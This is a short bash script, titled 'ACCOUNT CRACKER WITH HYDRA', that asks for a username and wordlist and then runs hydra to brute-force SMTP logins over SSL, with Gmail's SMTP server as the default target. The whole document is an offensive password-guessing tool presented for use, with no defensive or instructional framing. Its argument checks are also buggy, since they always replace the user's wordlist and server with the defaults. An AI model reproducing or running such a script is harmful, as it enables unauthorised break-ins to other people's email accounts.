#!/bin/bash

echo """

	ACCOUNT CRACKER WITH HYDRA

"""
USERNAME=$1
WORDLIST=$2
SERVER=$3

echo -n "input username >> "
read USERNAME

echo -n "input wordlist path>> "
read WORDLIST

echo -n "input server >> "
read SERVER

if [ !$2 ]
then
	WORDLIST="wordlist.txt"
	echo "using $pwd/wordlist.txt"
fi

if [ !$3 ]
then
	SERVER="smtp.gmail.com"
	echo "using smtp.gmail.com"
fi

echo 
echo "press ENTER to start attack !!!"
echo

read

hydra -l $USERNAME -P $WORDLIST -s 465 -S -v -V -t 4 $SERVER smtp
